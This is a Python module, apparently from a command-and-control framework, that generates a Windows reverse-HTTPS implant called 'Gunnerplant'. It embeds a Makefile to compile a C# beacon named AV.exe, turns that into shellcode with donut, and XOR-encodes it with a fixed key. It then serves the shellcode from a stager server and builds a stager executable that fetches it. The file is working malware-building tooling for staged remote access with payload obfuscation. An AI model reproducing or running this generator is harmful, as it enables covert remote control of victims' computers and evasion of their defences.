import base64
import os
import tempfile
import json
import subprocess
import shutil
from pathlib import Path
from types import SimpleNamespace
from core.payload_generator.common import payload_utils as payutils
from core.payload_generator.common.payload_utils import XorEncode
from core.payload_generator.windows.https.gunnerplant import build_make
from core.payload_generator.windows.https.gunnerplant.payload_files import program as make_raw
from core.payload_generator.windows.https.gunnerplant import payload_files
from core.malleable_engine.registry import PARSERS, LOADERS
import core.malleable_engine
from core.malleable_c2.malleable_c2 import get_listener_by_port_and_transport
from core.malleable_engine.base import load_plugins
from core import stager_server as stage

from colorama import init, Fore, Style
brightgreen = "\001" + Style.BRIGHT + Fore.GREEN + "\002"
brightyellow = "\001" + Style.BRIGHT + Fore.YELLOW + "\002"
brightred = "\001" + Style.BRIGHT + Fore.RED + "\002"
brightblue = "\001" + Style.BRIGHT + Fore.BLUE + "\002"
reset = Style.RESET_ALL

load_plugins()

MAKE_FILE = """
# Makefile for RunOF (Mono mcs build)

SHELL := /bin/bash

# --------------------------------------------------------------------
# Project settings (NO trailing spaces!)
# --------------------------------------------------------------------
PROJECT ?= RunOF
CONFIG  ?= Release        # Debug | Release
ARCH    ?= AnyCPU         # AnyCPU | x86 | x64

# Normalize ARCH/CONFIG (strip spaces, lower-case arch for path)
CONFIG_N := $(strip $(CONFIG))
ARCH_N   := $(strip $(ARCH))
ARCH_LC  := $(shell printf '%s' '$(ARCH_N)' | tr '[:upper:]' '[:lower:]')

# Output paths (VS-like)
OUTDIR := bin/$(ARCH_LC)/$(CONFIG_N)
OUTEXE := $(OUTDIR)/AV.exe

# Sources
SRC_ROOT      := Program.cs
SRC_INTERNALS := $(wildcard Internals/*.cs internals/*.cs)
SOURCES       := $(SRC_ROOT) $(SRC_INTERNALS)

# Optional app.config
APP_CONFIG     := $(wildcard App.config)
APP_CONFIG_OUT := $(OUTEXE).config

# Optional resources
RESX    := Properties/Resources.resx
RESFILE := Properties/Resources.resources
RESNAME := $(PROJECT).Properties.Resources.resources
RESGEN  := $(shell command -v resgen2 2>/dev/null || command -v resgen 2>/dev/null)

# References (adjust if needed)
REFS := \
	-r:System \
	-r:System.Core \
	-r:System.Xml.Linq \
	-r:System.Data.DataSetExtensions \
	-r:Microsoft.CSharp \
	-r:System.Data \
	-r:System.Net.Http \
	-r:System.Xml

# Defines & flags (mirror VS)
DEFINES := -define:TRACE
ifeq ($(CONFIG_N),Debug)
	DEFINES += -define:DEBUG
	OPTFLAGS := -debug
else
	OPTFLAGS := -optimize+
endif

ifeq ($(ARCH_N),x86)
	DEFINES += -define:_I386
else ifeq ($(ARCH_N),x64)
	DEFINES += -define:_AMD64
endif

UNSAFE ?= 1
ifeq ($(UNSAFE),1)
	UNSAFEFLAG := -unsafe
endif

PLATFLAG := -platform:$(shell printf '%s' '$(ARCH_N)' | tr '[:upper:]' '[:lower:]')

MCS := $(shell command -v mcs 2>/dev/null)
ifeq ($(strip $(MCS)),)
	$(error mcs not found. Install Mono (e.g., apt-get install mono-devel))
endif

# --------------------------------------------------------------------
# Targets
# --------------------------------------------------------------------
.PHONY: all build run clean distclean info

all: build

build: $(OUTEXE)

# Final executable
$(OUTEXE): $(SOURCES) | $(OUTDIR) $(RESFILE_OPT)
	@echo "==> Compiling $(PROJECT) ($(CONFIG_N), $(ARCH_N))"
	"$(MCS)" \
		$(PLATFLAG) $(OPTFLAGS) $(UNSAFEFLAG) $(DEFINES) $(REFS) \
		-langversion:7.2 \
		-target:exe -out:"$@" \
		$(SOURCES) \
		$(RESOPT)
	@echo "OK -> $@"

# Output directory (single recipe; no duplicates)
$(OUTDIR):
	@mkdir -p "$@"

# -------- Optional: embed Resources.resx if present --------
ifneq ($(wildcard $(RESX)),)
RESFILE_OPT := $(RESFILE)
RESOPT := -resource:$(RESFILE),$(RESNAME)

$(RESFILE): $(RESX)
ifeq ($(strip $(RESGEN)),)
	$(error resgen/resgen2 not found to convert $(RESX); install mono-devel)
endif
	@echo "==> resgen $(RESX) -> $(RESFILE)"
	@mkdir -p "$(@D)"
	"$(RESGEN)" "$<" "$@"
endif

# -------- Optional: copy App.config if present --------
ifneq ($(strip $(APP_CONFIG)),)
build: $(APP_CONFIG_OUT)

$(APP_CONFIG_OUT): $(APP_CONFIG) | $(OUTDIR)
	@cp "$(APP_CONFIG)" "$(APP_CONFIG_OUT)"
	@echo "Copied App.config -> $(APP_CONFIG_OUT)"
endif

run: build
	@echo "==> Running $(OUTEXE)"
	@mono "$(OUTEXE)"

clean:
	@rm -rf bin obj $(RESFILE)
	@echo "Cleaned build artifacts."

distclean: clean
	@echo "Distclean complete."

info:
	@echo "PROJECT = $(PROJECT)"
	@echo "CONFIG  = $(CONFIG_N)"
	@echo "ARCH    = $(ARCH_N)"
	@echo "OUTEXE  = $(OUTEXE)"
	@echo "SOURCES = $(SOURCES)"
	@echo "RESX    = $(if $(wildcard $(RESX)),yes,no)"
	@echo "APP.config = $(if $(APP_CONFIG),yes,no)"

"""

def _cs_escape(s: str) -> str:
	return s.replace("\\", "\\\\").replace('"','\\"')

def _emit_header_lines(headers: dict, var: str, is_post: bool=False) -> str:
	lines = []
	for k, v in (headers or {}).items():
		if is_post and k.lower() == "content-type":
			lines.append(f'{var}.Content = "new StringContent(json, Encoding.UTF8, {_cs_escape(v)})";')
		else:
			lines.append(f'{var}.Headers.TryAddWithoutValidation("{_cs_escape(k)}", "{_cs_escape(v)}");')
	return "\n".join(lines)

def _emit_post_json_expr(mapping: dict | None) -> str:
	#env = (envelope or "base64-json").lower()
	m = mapping or {"output": "{{payload}}"}
	templ = json.dumps(m, separators=(",", ":"), ensure_ascii=False)
	templ = _cs_escape(templ)
	repl = "\" + outB64 + \""
	templ = templ.replace("{{payload}}", repl)
	return f"\"{templ}\""

def generate_gunnerplant_reverse_https(ip, port, obs, beacon_interval, headers, useragent, stager_ip="0.0.0.0", stager_port=9999,
	accept=None, byte_range=None, jitter=None, profile=None, parser_name="json", loader_name="exe_csharp_https_profile_loader", scheme="https"):

	listener_status = get_listener_by_port_and_transport(port, scheme)
	if not listener_status:
		print(brightred + f"[!] No {scheme} listener setup on port {port}")
		return None

	# Parse → Load → Config for this emitter
	cfg = None
	if profile:
		parser_cls = PARSERS.get(parser_name)
		loader_cls = LOADERS.get(loader_name)
		print(f"PARSERS: {PARSERS}, LOADERS: {LOADERS}")
		if not parser_cls or not loader_cls:
			raise ValueError(f"Parser/Loader not found: {parser_name}/{loader_name}")
		prof = parser_cls().parse(profile)
		if prof is None:
			raise ValueError(f"Invalid profile: {profile}")
		defaults = {
			"headers": headers or {},
			"useragent": useragent,
			"accept": accept,
			"host": (headers or {}).get("Host"),
			"byte_range": byte_range,
			"interval": beacon_interval,
			"jitter": jitter,
			"port": port,
			"transport": scheme,
		}
		cfg = loader_cls().load(prof, defaults=defaults)

	else:
		# No profile → still honor the GUI fields (headers, UA, accept, range, beacon)
		h = headers or {}
		cfg = SimpleNamespace(
			# URIs
			get_uri="/",
			post_uri="/",
			# Headers
			headers_get=h,
			headers_post={k: v for k, v in h.items() if k.lower() != "content-length"},
			# Common header-ish fields
			useragent=useragent or "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
			accept=accept,
			host=h.get("Host"),
			byte_range=byte_range,               # handled safely in make_raw (numeric-only AddRange)
			accept_post=accept,
			host_post=h.get("Host"),
			# Timing
			interval_ms=int(beacon_interval) * 1000 if beacon_interval else None,
			# Mapping defaults so POST body is {"output":"<b64>"} and GET extracts JSON "output"/"cmd"/"Telemetry"
			get_server_mapping={},
			post_client_mapping={"output": "{{payload}}"},
		)

	if profile:
		raw = make_raw(ip, port, cfg=cfg, scheme=scheme, profile=True)

	else:
		raw = make_raw(ip, port, cfg=cfg, scheme=scheme, profile=False)

	print(raw)

	out = Path.cwd()
	payload_file = build(out, raw)

	# 2) write to temp .c file
	fd, c_path = tempfile.mkstemp(suffix=".cs", text=True)
	try:

		# 4) run donut to produce shellcode blob (format=raw)
		sc_path = payload_file[:-4] + ".bin"
		donut = shutil.which("donut")
		# -f 1 => raw shellcode, -a 2 => amd64, -o => output
		donut_cmd = [donut, "-b", "1", "-f", "3", "-a", "2", "-o", sc_path, "-i", payload_file]
		#print(f"[+] Generating shellcode: {' '.join(donut_cmd)}")
		subprocess.run(donut_cmd, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) #stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL

		# 5) read the shellcode blob into memory
		try:
			with open(sc_path, "rb") as f:
				shellcode = f.read()

		except Exception as e:
			print(f"ERROR: {e}")

		shellcode = shellcode.replace(b"unsigned char buf[] =", b"")

		with open(sc_path, "wb") as f:
			f.write(shellcode)

		with open(sc_path, "rb") as f:
			donut_file = f.read()

		"""with open("/home/kali/tools/C2/Gunner/gunnerc2/implantdev/learning/c-reverse-shell/rveshell/new/donut_file.c", "wb") as f:
			f.write(donut_file)"""

		# 6) XOR‑encode it using our XorEncode helper
		encoder = XorEncode()
		#encoder.shellcode = bytearray(shellcode)
		length = len(shellcode)
		#print("AFTER length")
		#print("MAKING TEMP FILES FOR XOR ENCODE")

		fd, output_trash = tempfile.mkstemp(suffix=".bin", text=True)
		fd, xor_main_output = tempfile.mkstemp(suffix=".c", text=True)
		payload = encoder.main(sc_path, output_trash, "deadbeefcafebabe", xor_main_output)
		print(f"BUILT PAYLOAD OF TYPE {type(payload)}")
		out = Path.cwd() / "Gunnerplant.exe"
		#print("STARTING STAGER SERVER")
		#print(f"IP: {stager_ip}, PORT: {stager_port}")
		#print(f"PORT: {type(stager_port)}, PAYLOAD: {type(payload)}, IP, {type(stager_ip)}")
		stage.start_stager_server(stager_port, payload, format="bin", ip=stager_ip)
		#print(brightgreen + f"[+] Serving shellcode via stager server {stager_ip}:{stager_port}")
		#print("RUNNING BUILD")
		build_status = build_make.build(out, payload, stager_ip, stager_port)
		if build_status:
			return True

	except Exception as e:
		print(brightred + f"[!] Error {e}" + reset)

	finally:
		# clean up temp files
		for p in (payload_file, sc_path, output_trash, xor_main_output):
			try:
				os.remove(p)

			except OSError:
				pass


def dump_templates(tmp: Path, raw: str):
	"""Create src/ and include/ and write everything out."""
	src = tmp / "Internals"
	src.mkdir()

	# Write Makefile
	(tmp / "Makefile").write_text(MAKE_FILE.lstrip(), encoding="utf-8")

	main_code = raw
	(tmp / "Program.cs").write_text(main_code.lstrip(), encoding="utf-8")

	# Write sources: any top‐level var in source_files ending in _C or _ASM
	for name, content in vars(payload_files).items():
		print(name)
		if name in ("MAIN_CS", "program"):
			continue

		elif name.endswith("_CS") and name == "IAT_CS" and "__" not in name and isinstance(content, str):
			path = src / f"{name[:-3]}.cs"
			path.write_text(content.lstrip(), encoding="utf-8")

		elif name.endswith("_CS") and name not in ("MAIN_CS", "IAT_CS") and "__" not in name and isinstance(content, str):
			path = src / f"{name[:-3].lower()}.cs"
			path.write_text(content.lstrip(), encoding="utf-8")

	os.system(f"ls -la {src}")

	return True


def build(output_path: Path, raw: str):
	# 1) Create temp workspace
	#print("IN BUILD")
	tempdir = Path(tempfile.mkdtemp(prefix="sc_build_"))
	try:
		dump = dump_templates(tempdir, raw)
		if dump:
			# 2) Run make stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
			subprocess.run(["make", "clean"], cwd=tempdir, check=True)
			subprocess.run(["make", "CONFIG=Debug", "ARCH=x64", "build"], cwd=tempdir, check=True)

			# 3) Copy AV.exe out
			shutil.copy(tempdir / "bin" / "x64" / "Debug" / "AV.exe", output_path)
			print(brightgreen + f"Built AV.exe → {output_path}")
			payload_file = f"{output_path}/AV.exe"
			return payload_file

	finally:
		# 4) Cleanup
		shutil.rmtree(tempdir)


